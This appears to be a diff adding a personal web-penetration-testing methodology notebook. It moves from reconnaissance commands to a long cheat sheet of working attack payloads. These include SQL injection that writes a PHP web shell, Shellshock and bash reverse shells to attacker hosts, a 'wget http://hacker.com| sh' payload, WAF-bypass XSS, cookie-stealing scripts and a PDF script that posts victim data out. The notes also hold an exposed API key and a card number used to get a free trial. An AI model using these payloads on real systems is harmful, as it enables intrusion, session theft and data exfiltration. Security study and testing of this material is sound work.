@@ -1,0 +1,3618 @@
+# Methodology
+
+- **Subdomain enumeration**
+    - security trails
+        
+        https://securitytrails.com/
+        
+        ```jsx
+        curl --request GET  --url 'https://api.securitytrails.com/v1/domain/bluewin.ch/subdomains?children_only=false&include_inactive=true'  --header 'APIKEY: OiSPcqv8pcW5ZWmlhmnWNyDo5FZAQHaU'  --header 'accept: application/json'
+        ```
+        
+    - subdoaminfinder c99 nl
+        
+        https://subdomainfinder.c99.nl/
+        
+    - https://shrewdeye.app/search/
+        - [https://www.vedbex.com](https://www.vedbex.com/)
+            
+            [https://dnsdumpster.com/](https://dnsdumpster.com/static/map/swisscom.ch.png)
+            
+    - ASN enumeration
+        
+        https://bgp.he.net/search   ⇒ find asn for company
+        
+        shodan search asn:[AS8300](https://bgp.he.net/AS8300)
+        
+        use [hakrevdns](https://github.com/hakluke/hakrevdns) to reverse cidr and get domains
+        
+        ```jsx
+         prips 173.0.84.0/24 | hakrevdns  -r 1.1.1.1
+         
+         masscan 193.110.154.0/24  -p 1-65535  --rate 100000 --output-format json --exclude 255.255.255.255 --output-filename
+        scan-results.json
+        
+         cat scan-results.json | sed -e '/^\[/d' -e '/^\]/d' -e 's/,$//' | jq -r '[.ip, .ports[0].port] | @tsv' | sed 's/\t/:/' | sort -u > alive-hosts
+        ```
+        
+    - amass
+        
+        ```jsx
+        amass enum -config /root/.config/amass/config.yaml -df httpx -t /root/nuclei-temlates/ -o nuclei
+        
+        amass intel -org "Tesla" 
+        and the output would be :
+        8911, TESLATEL-AS 
+        50313, TESLATEL-AS
+        394161, TESLA - Tesla
+        
+        amass intel -active -asn 394161 => ASN
+        whois -h whois.radb.net -- '-i origin AS3303' | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u
+        ------------------------------------------------------------
+        amass intel -active -cidr 192.168.1.0/24
+        
+        ```
+        
+    - dnscan
+        
+        ```json
+        python3 /home/hossam/tools/dnscan/dnscan.py -d [gs.com](http://gs.com/) -w best-dns-wordlist.txt -t 1000
+        ```
+        
+    - **Reverse_Ip**
+        
+        ```jsx
+         prips 173.0.84.0/24 | hakrevdns  -r 1.1.1.1
+        for i in `prips 194.147.200.0/21`; do dig -x $i +short ;done 
+        https://search.dnslytics.com/cidr/
+        https://viewdns.info/reverseip/?host=
+        ```
+        
+    - subfinder
+        
+        echo “site.com” | subfinder 
+        
+    - assetfinder
+        
+        ```jsx
+        cat domains | assetfinder -subs-only
+        ```
+        
+    - virtual host
+        
+        ```jsx
+         ffuf -u https://example.com -w wordlist -H "Host: FUZZ.example.com" 
+        ```
+        
+    - email address enumeration
+        
+        [https://newapp.anymailfinder.com](https://newapp.anymailfinder.com/) and make free trial year account with 
+        
+        ```json
+        5194710001334019
+        01/25
+        123
+        usa
+        10010
+        -----------------------------
+        then discover all domains related to specific email
+        https://website.informer.com/email/it-domains@snapchat.com
+        ```
+        
+    - crt sh
+        
+        ```json
+        crt_org.sh
+        ./crt_org.sh Swisscom+(Schweiz)+AG		=> should replace any space with +
+        curl '[https://crt.sh/?o=%.'$1'&output=json'](https://crt.sh/?o=%25.%27$1%27&output=json%27) | jq -r '.[].common_name' | grep -v '*' | sort | uniq | tee -a domainsOrg.txt
+        curl -s "https://crt.sh/?q=%25.rednexus.tech&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+        ```
+        
+    - Nelas
+        
+        ```json
+        search for subdomains :
+        https://app.netlas.io/domains/?indices=&page=1&q=domain%3A(domain%3A*.paypal.com)
+        if found vulnerablity then try to search for all assets vulnerable to same 
+        by checking the response body and take any word and search by it : (hubspot)
+        https://app[.]netlas[.]io/responses/?q=http.body:(hubspot)&page=1&indices=
+        to search for jenkens for example :
+        https://app[.]netlas[.]io/responses/?q=http.headers.x_jenkins:* OR http.headers.x_jenkins_cli2_port:* OR http.headers.x_jenkins_session:*&page=1
+        ```
+        
+    
+    ```json
+    cat allsubdomains | egrep "internal|dev|jira|admin|secret |test|production|private|login|staging|dev"
+    ```
+    
+- **Subdomain Takeover**
+    
+    ```json
+    # subzy run --targets subs.txt --hide_fails --vuln  | grep -v -E "Akamai|xyz|available|\-"
+    subjack -w subs.txt -t 100 -timeout 30 -o takeovers -ssl
+    ## aws take
+    http -b GET http://{SOURCE DOMAIN NAME} | grep -E -q '<Code>NoSuchBucket</Code>|<li>Code: NoSuchBucket</li>' && echo "Subdomain takeover may be possible" || echo "Subdomain takeover is not possible"
+    ```
+    
+- **Gather all urls with**
+    - waybackurl
+    
+    ```jsx
+    echo "example.com" | waymore
+    gospider -S httpx | sed -n 's/.*\(https:\/\/[^ ]*\)]*.*/\1/p' >> gospider.txt
+    user dumpster to collect all hosts related to domain 
+    https://web.archive.org/cdx/search/cdx?url=*.example.com&fl=original&collapse=urlkey
+    ```
+    
+    - senstive files
+        
+        ```jsx
+        cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+        ```
+        
+        ```jsx
+        nuclei -l allurls.txt  -t /root/nuclei-templates/http/exposures
+        ```
+        
+- **Grep all php**
+    - grep php
+        
+        ```jsx
+        cat allurls | grep ".php" | httpx -o php.txt
+        ```
+        
+    - use arjun
+        
+        ```jsx
+        for i in `cat php.txt`;do arjun -u $i ;done
+        arjun -u https://example.com/file.php --get 
+        arjun -u https://exmaple.com/file.php -m GET 
+        python3 arjun.py -i burp_targets.txt
+        ```
+        
+    - use paramspider
+        
+        ```jsx
+        paramspider -d example.com >> allparam
+        cat allparam | grep "FUZZ" >> fuzzing.txt
+        ```
+        
+    - use nuclei with fuzzing templates
+        
+        ```jsx
+        	nuclei -l fuzzing.txt -t /root/fuzzing-templates -o secrets.txt
+        ```
+        
+- **Grep js**
+    - javascript analysis
+        
+        ```jsx
+        cat allurls | grep -E "\.js" >> alljs
+        
+        ----------------------------------------------
+        linkfinder.py -i Target.com -d -o alljs |
+        cat js.txt  | while read url; do python3 /home/kali/tools/SecretFinder/SecretFinder.py  -i $url -o cli; done
+        ---------------------------------------------
+        nuclei -t /root/nuclei-templates/http/exposures/ -l js
+        nuclei -l js.txt -t nuclei-temlates/exposures/tokens/generic
+        after gathering tokens use  ( token-spray ) template 
+        nuclei -t nuclei-templates/token-spray -var token=goanmginaonim
+        or can use file of tokens in token=token_file
+        ----------------------------------------------
+        python jsscan.py urls.txt js-url.txt js-directory => https://github.com/Or4ngm4n/jsscan
+         1- save javascirpt urls in js-url
+         2- save directories in js-directory
+        use jsnice.org/
+        use jsluice 
+        -------------------------------------------------
+        cat test.txt| grep -aEo 'https?://[^ ]+' | sed 's/]$//' | sort -u| grep -aEi "\.(js)"
+        ------------------------
+        
+        ```
+        
+        ```jsx
+        use https://github.com/MrEmpy/mantra 
+        cat js.txt | mantra
+        ```
+        
+- Burp config
+    
+    put regex  in history 
+    
+    ```json
+    
+    (?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
+    ip address => ((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)
+    s3 buckets => (s3-|s3\.)?(.*)\.amazonaws\.com
+    LINKDUMPER extension to extract all links , paths from response
+    BURPJSfinder 
+    -------------------------------
+    go to proxy => match and replace => put domain name, replace it with collab
+    -------------------------------
+    if 304 Not modified => delete If-Modified-Since: and If-None-Match 
+    and put two blank lines then would be 200 Ok
+    
+    ```
+    
+- **nuclei**
+    
+    ```powershell
+    nuclei -l httpx -t brute-force/* -t cves/* -t basic-detections/* -t dns/* -t files/* -t panels/* -t security-misconfiguration/* -t subdomain-takeover/* -t technologies/* -t token/* -t vulnerablilies/* 
+    ```
+    
+- Firefox Extensions
+    
+    **Gopher**
+    
+    **PwnFox**
+    
+    .git
+    
+    Retire.js   to find javascript vulnerable libraries
+    
+- **httpx**
+    
+    ```jsx
+    httpx -path /.git -sc --silent
+    httpx -path /.git/config -sc --silent
+    httpx -path /.git/logs/HEAD -sc --silent
+    cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+    httpx -l domains.txt --status-code --title -path /phpinfo.php | grep 'phpinfo()'
+    ```
+    
+- **Gttp request smuggling**
+    
+    use [smuggler](https://github.com/defparam/smuggler) to check automatically and then 
+    
+    https://hackerone.com/reports/737140
+    
+    ![s1.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/f6051861-f426-46aa-9018-df4bb6bdf1e8/s1.png)
+    
+    ![CLTE_explained.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/658560f7-4503-458a-a7a4-07910fec7f14/CLTE_explained.png)
+    
+    ```json
+    
+    ## CL.TE 
+    GET / HTTP/1.1 => from inspector => Request attributes => choose 1.1
+    Host: example.com 
+    Content-Length: 33    ==> 32 + 1
+    Transfer-Encoding: chunked
+    
+    0         ==> 0 indecate end of first request 
+    
+    GET /hossam.txt HTTP/1.1
+    X: tst
+    ```
+    
+    ```json
+    ##CL.TE
+    POST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+    
+    60
+    POST /x.txt HTTP/1.1
+    Content-Length: 15
+    Content-Type: application/x-www-form-urlencoded
+    
+    x=1
+    0\r\n
+    \r\n
+    
+    ```
+    
+    ```json
+    ##TE.TE
+    
+    ```
+    
+- **IIS**
+    
+    ```json
+    shortscan https://example.com -F
+    ------------------------------------
+    when HTTPAPI/2.0 in the response header means that there is an application behind the website but it can't access the server 
+    1- Check for SSL Certificate to know the subdomain. Add it in the request Host , it may redirect you to the main application where the server found 
+    
+    Use Host Hopping Technique to identify Vhosts
+    1- if you found apply.domain.com .
+       Brute force the subdomain name in case there is a VHOST found 
+    2- If you get 'mssql.doain.com' 
+      and it redirects you to apply.domain.com/mssql 
+      then it is a VHOST and you found important directory
+    
+    Local File Disclosure to Download DLL files 
+    /haproxy
+    /netdata
+    1- Try to grab the web.config and global.asax files
+    DownloadCategoryExcel?fileName=../../web.config
+    WEB-INF/web.xml
+    DownloadCategoryExcel?fileName=../../global.asax
+    2- you will ind the names of DLL files
+    <add namespace="Company.Web.Api.dll"/>
+    3- Try Download the DLL File.
+    DownloadCategoryExcel?fileName=../../bin/Company.Web.Api.dll
+    /download_page?id=..%2f..%2fweb.config
+    /download_page?id=..%2f..%2fViews/web.config
+    /download_page?id=..%2f..%2fbin/WebApplication1.dll
+    /trace.axd
+    
+    4- You can Reverse Engineer the DLL Files and Get the Srouces Code of the applicatoin
+    if you reached that far so report it 
+    
+    Local File Discloure to Rce 
+    1- if you can read the web.config file you can almos always get RCE 
+    2- Obtain the `machinekey` variable from the `web.config` file [ValidionKey, decryptionkey
+    3- Use this Tool and Steps : https://github.com0xacb/viewgen
+    4- VIEWSTATE -> ObjectStatFormatter (Insecure Deserlisation) -> RCE
+    --------------------
+    use scanner/http/iis_shortname_scanner => metasploit 
+    --------------------
+    iis 7.5
+    /admin:$i30:$INDEX_ALLOCATION/admin.php
+    /admin::$INDEX_ALLOCATION/admin.php
+    
+    ------------------------------
+    nmap -p80 --script http-iis-short-name-brute 71.167.30.116
+    
+    directory index via /Downloads , /Resources , /webdav
+    curl -X PUT  -T hello.html  http://demo.ine.local/uploads/
+    curl -X PUT  -T bye.html  http://demo.ine.local/uploads/
+    ```
+    
+    use sns 
+    
+- **Test**
+    
+    test sitename as directory ⇒ https://example.com/example/ or https://site.com/site/
+    
+    target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
+    
+    http://something.example.com/?vuln_param=https://accounts.google.com/o/oauth2/revo
+    ke?callback=alert(1337)
+    
+    - sql injection
+        
+        ```jsx
+        
+        sqlmap -u https://example.com/file.ashx?id=1 --technique=BT --dbs 
+        sqlmap.py -r request --batch --random-agent --tamper=space2comment --drop-set-cookie --banner --threads 10 --dbs
+        sqlmap -u "target/?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries
+        --ignore-code 500
+        chcek cookies , user-agent- x-forwarde-for , host
+        sqlmap -u xxxx —headers="Cookie: *" -H "x-forwarded-for: *" -H "x-forwarded-Host: *"
+        **## sqlmap for login page**
+        sqlmap -u "https://example.com/login.php" --data="username=xxx&password=yyy" --risk 3 --level 5 --banner
+        **## bypass firewall  => change case ex: select SElect**
+        sqlmap -u "https://example.com/search.php?id=1" --tamper=randomcase --banner --risk 3 --level 5 
+        cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+        cat subdomains.txt | dnsx | waybackurl| uro grep "\?" | head -20 | httpx --silent >> urls;sqlmap -m urls --batch --random-agent --level2 | tee sqlmap.txt 
+        nodejs sql injection payload : username=admin&password[password]=1
+        ```
+        
+        ```jsx
+        change Content-type to Content-Type: application/x-www-form-urlencoded then
+        inject headers with  if(now()=sysdate()%2Csleep(10)%2C0) => fuzz headers 
+        /number_trips/1/999%20or%201=1--
+        ' OR 1=1 -- -  bypass login 
+        'or 1=1 limit 1-- -   bypass login
+        Referer: https://example.com/'; DROP TABLE Users; --
+        User-Agent: '; SELECT * FROM Users; --
+        POST /register…..
+        Firstname=blabla%'+WAITFOR+DELAY+'0:0:9'--&Lastname=blabla
+        Hot: ';WAITFOR DELAY '0:0:10'--
+        User-Agent: gggggggggggggggggggggggg';WAITFOR DELAY '0:0:10'--   => 10sec
+        X-Forwrded-For: ';WAITFOR DELAY '0:0:10'--     =>10ec
+        Oracle => .'; IF 1=1 WAITFOR DELAY '0:0:5'--'
+        
+        MSSQL =>	WAITFOR DELAY '0:0:10'
+        MySQL/MariaDB =>	AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')
+        PostgreSQL  => 	|| (SELECT 1 FROM PG_SLEEP(10))
+        Oracle =>	AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)
+        
+        GET /directory/0'XOR(if(now()=sysdate(),sleep(13),0))XOR'z HTTP/1.1
+        - view=1'+AND+333=(select+333+from+pg_sleep(4))+AND+apVT'='apVT
+        - search=0'XOR(if(now()=sysdate()%2Csleep(100)%2CO))XOR'Z
+        - Cookie: hossam'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+        - query=1+OR+IF(1%3d1,+(SELECT+1+FROM+
+        - (SELECT+SLEEP(MID(version(),1)))+AS+v),+0)
+        - 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+        Cookie: hossam'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+        X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+        User-Agent: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+        User-Agent: () { :; }; /bin/sleep 5
+        User-Agent: () { :; }; /bin/nc -e /bin/sh <hacker_ip 80>
+        Referer: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+        - User-Agent: zerodiumsleep(5);
+        - User-Agent: zerodiumsystem('id');
+        - "username":"hsosamshady;sleep(111)"
+        - Parameter=randomtext%' OR SLEEP (5) #
+        - {	"username":"admin","password":"' OR 1=0--"}
+        sql injection via headers
+        Accept: '" or sleep(30)="'
+        Accept-Charset: '" or sleep(30)="'
+        Accept-Datetime: '" or sleep(30)="'
+        Accept-Encoding: '" or sleep(30)="'
+        Accept-Language: '" or sleep(30)="'
+        Authorization: '" or sleep(30)="'
+        Cache-Control: '" or sleep(30)="'
+        Connection: '" or sleep(30)="'
+        Content-Length: '" or sleep(30)="'
+        Content-MD5: '" or sleep(30)="'
+        Content-Type: '" or sleep(30)="'
+        Cookie: '" or sleep(30)="'
+        Date: '" or sleep(30)="'
+        Expect: '" or sleep(30)="'
+        Forwarded: '" or sleep(30)="'
+        From: '" or sleep(30)="'
+        If-Match: '" or sleep(30)="'
+        
+        Content-Disposition: form-data; name="mimetypeid"
+        1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)
+        '+(select*from(select(sleep(15)))a)+'
+        
+        to know your current privilege : user()
+        to make privilege escalation : 
+        cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+        cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+        ```
+        
+        ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/8b43d826-286c-4caf-9fdb-8f5c2c3bd12a/Untitled.png)
+        
+    - test RCE via parameters and search
+        
+        ```jsx
+        GET /home.html?search={{url_for.**globals**.os.popen(request.headers.hack).read()}}
+        hack: id
+        ---------------------------
+        User-Agent: zerodiumsystem("id")   => for php systems 
+        ---------------------------
+        GET /cgi-bin/status
+        User-Agent: () { ignored }; echo Content-Type: text/plain ; echo ; echo; /usr/bin/id;
+        ---------------------------
+        Accept: ../../../../../../../../../../etc/passwd{{
+        ---------------------------
+        Local File Discloure to Rce 
+        1- if you can read the web.config file you can almos always get RCE 
+        2- Obtain the `machinekey` variable from the `web.config` file [ValidionKey, decryptionkey
+        3- Use this Tool and Steps : https://github.com0xacb/viewgen
+        4- VIEWSTATE -> ObjectStatFormatter (Insecure Deserlisation) -> RCE
+        ----------------------------
+        inject  cve 2023-1389 via www-url-encoded payload body
+        operation=write&country=$(id>`wget http://hacker.com| sh)
+        ----------------------------
+        curl -H "user-agent: (){ :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" https://example.com/thing.cgi
+        -----------------------------
+        paramet+er='.print((`id`)).'
+        ------------------------------
+        file=/etc/passwd    => 403
+        file=L2V0Yy9wYXNzd2Q=     => 200
+        
+         ; bash -c "bash -i >& /dev/tcp/192.60.98.2/4444 0>&1"
+         
+         GET http://10.10.78.181:5000/api/v1/resources/books?show=/etc/passwd
+        
+        CVE 2021-41277
+        https://example.com/api/geojson?url=file:///etc/passwd
+        ```
+        
+        ![rce.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/fb261df9-e790-4d17-ae27-e0e51addb042/rce.png)
+        
+        ![rce2.jpeg](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/02ddbf4a-0e3a-433c-9d70-5287301fe4af/rce2.jpeg)
+        
+        ![GSSJKnIWQAEVoaq.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/1a52677b-630f-47e7-9e78-e85e961c6329/GSSJKnIWQAEVoaq.png)
+        
+    - XSS BYPASS
+        - swagger-ui for dom xss
+            
+            ```json
+            Find swagger endpoints https://github.com/doosec101/swagger_scanner
+            ?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json
+            ?config=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json
+            ?configUrl=data:text/html;base64,exwoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9
+            ```
+            
+        - Try to put in field name and rename it again and try again
+        - Places Blind Xss
+            
+            ```json
+            Blind xss (on contact forms , username, ticket support , referer header , custom site analystics , user-agent , comments )
+            cat subs.txt | gau | bxss -payload '"><script src=https://xss.report></script>' -header "X-Forwarded-For"
+            1. Visit your email client like Gmail 
+            2. Search for Unsubscribe/feedback/Manage preferences.
+            3. Click on Unsubscribe and put BXSS payload if they ask for any feedback."><script src=//blindf.com/bx.php// (don't close the tag 
+            
+            ---------------------------------
+            1- create account 
+            2- delete account or deactivate 
+            3- if asked for feedback put your blind xss payload
+            ----------------------------------
+            x-forwarded-host: a."><script>alert(1)</script>"
+            Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"
+            ----------------------------------------
+            chaining xss with csrf :
+            1- inject <script src="https://hacker.com/exploit"></script>
+            2- put in hacker.com payload : window.location = "https://Ip_of_hacker:<port>/cookiestealer?c=" + document.cookie
+            3- create server and certificate in your machine :
+            # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+            server.py: 
+            from http import server
+            import ssl
+            
+            httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
+            
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            context.load_cert_chain(certfile='./server.pem')
+            
+            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+            
+            httpd.serve_forever()
+            ----------------------------------
+            
+            ```
+            
+        - use content-encoding: anything and inject stored xss as
+        
+        ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/8bfa5baf-0bf5-4d15-bf0d-43b011e9de68/Untitled.png)
+        
+        ```jsx
+        **use xssStrike
+        BruteXss 
+        Xsser
+        `'>+<script>alert()</script>`
+        
+        /somepath"><script>alert()</script>/somepath/
+        if you have parameter takes email then :
+        test@gmail.com'\"><svg/onload=confirm()>
+        
+        <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>  => cloudflare
+        
+        <%2FsCripT><
+        scRIPt>alert(document.cookie)<%2FsCrIpT>  => bypass cloudflare
+        "><img/src=%20only=1%20OnErRor=x=alert``><!--  => bypass Cloudflare**
+        
+        q=1%27"><Img%0ASrc%0A=OnXSS%0AOnError%0A=alert(1)>
+        <Svg Only=1 Onload=confirm(document.cookie)>
+        
+        filename="<img src=x onerror=javascript:alert()> image.jpg"
+        cloudflare bypass <svg/onload=window["al"+"ert"]`1337`>
+        x=alert,x(1)
+        "><svg/onload=confirm(document.cookie)>"@x.y
+        redirect=javascript:alert() => instead of site 
+        <<hee>script> document.location.href='https://google.com'; <<hee>script>
+        parameter=%22)%20die(msg%3a%22%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e%22)%2f%2f
+        <ifram src="https://bing.com"></iframe>
+        <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
+        <a href="#" id="uniqueLink">Click me</a> <script> (function() { var a = ['\x6F\x70\x65\x6E', '\x77\x72\x69\x74\x65', '\x63\x6C\x6F\x73\x65', '\x70\x72\x69\x6E\x74', '\x61\x6C\x65\x72\x74']; var b = ['@', 'h', 'x', 'l', 'x', 'm', 'j']; var c = ['B', '1', 'P', '4', '$', '$']; document.getElementById('uniqueLink').onclick = function() { var w = windowa[0]; w.documenta[1]; w.documenta[2]; wa[3]; windowa[4]; }; })(); </script>
+        <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+        <Img Src=OnXSS OnError=confirm(1)>
+        payload : test"><img src=x on0x=1 onerror=alert(/POC/)>
+        <div style="width:100%;height:100vh;" onpointerover="[][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')](https://www.notion.so/decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))()"> </div>
+        <img src=x onVector=X-Vector onerror=alert(1)>
+        jaVasCript:/*/*/*\\/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*┯┪prompt(1)┯┻/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
+        Payload : %22%3E%3Csvg%20onload%3dalert%26%230000000040%22100%22)%3E
+        Payload : </script><embed/embed/embed/src=//[14.rs](http://14.rs/)>
+        <DiV sTylE="WidTH:100%;HeIgHt:100vH;" oNpOINteROvEr="var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](https://www.notion.so/_0x2bcd.join(''))((97^0)===97?1:0);"></dIV>
+        -><svg%20onload=alert%26%230000000040document.cookie)>
+        "><sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+        test"%20onmouseover="prompt%26%2300000000000000000040;%27XSS%27%26%2300000000000000000041;
+        <svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>
+        "><svg/onload=alert%26%230000000040"Hacked")>
+        <div style="width:100%;height:10Ovh;" onpointerover="[][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72)][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72)](decodeURIComponent('%61%6C%65%72%74%28%64%6F%6 3%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))0)"> </div>
+        <a href="#" onclick="var w = [window.open/**/(/**/](http://window.open/**/(/**/));w.document.write/**/('Hello, world!'/**/); w.document.close/**/(/**/);w.print/**/(/**/); alert/**/('B1P4$$'/**/);">Click me</a>
+        if found jenkins plugin test /gitlab/"><svg/onload=confirm()>
+        
+        ######XSS lead to Account takeover
+        '"><svg onload=document.forms[1].action='https://attacker.com/?Hacked'>
+        
+        ---------------------
+        exploit
+          <script>
+                    /*
+                    this script will create a hidden <img> element
+                    when the browser tries to load the image
+                    the victim's cookies will be sent to your server
+                    */
+        
+                    var new_img = document.createElement('img');
+                    new_img.src = "http://yourserver/" + document.cookie;
+                    new_img.style = 'display: none;'
+                    document.body.appendChild(new_img);
+                </script>
+        --------------------
+        <script>
+        new Image().src="https://hacker.com/file.php?cc="+
+        escape(sessionStorage.getItem('sessionID'));
+        </script>
+        -----------------------------
+        open redirect to xss
+        java%0d%0ascript%0d%0a:alert(0)
+        j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
+        java%07script:prompt`0`
+        java%09scrip%07t:prompt`0`
+        jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
+        pjavascriptt:confirm`0`
+        ```
+        
+    - Content-Security-Policy
+        
+        ```json
+        Content-Security-Policy: Script-src 'self' googleapis.com
+        <div ng-app ng-csp id=p ng-click=$event.view.alert("XSS")><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.6/angular.min.js"></script><script async src=//ajax.googleapis.com/jsapi?callback=p.click></script>
+        -------------------------------------------------------
+        Content-Security-Policy: Script-src 'self'   => flash file
+        <object type='application/x-shockwave-flash' data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\%22})))}catch(e){alert(/XSS/)}//'><param name='AllowScriptAccess' value='always'></object>
+        -------------------------------------------------------
+        Content-Security-Polciy: default-src 'self'
+        1- Upload Polyglot file (x.gif or x.jpeg )  => see [site](https://csplite.com/csp/test413/)
+        2- <script src=https://vicitm.com/Location/x.jpeg>
+        -------------------------------------------------------
+        % steal user csrf token from his page once open my pdf
+        1 0 obj <<>>
+        stream
+        <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+        <config><present><pdf><interactive>1</interactive></pdf></present></config>
+        <template>
+            <subform name="_">
+                <pageSet/>
+                <field id="Hello world">
+                    <event activity="initialize">
+                         <script contentType="application/x-formcalc">
+        					var content = Get("https://victimsite.com/profile.php");
+        					Post("https://attackerServer.com/log.php",content);
+        			</script>
+        		    </event>
+        		</field>
+        	    <subform>
+        </template>
+        </xdp:xdp>
+        
+        ```
+        
+    - XSL
+        
+        if yes then save request in file and send to victim
+        
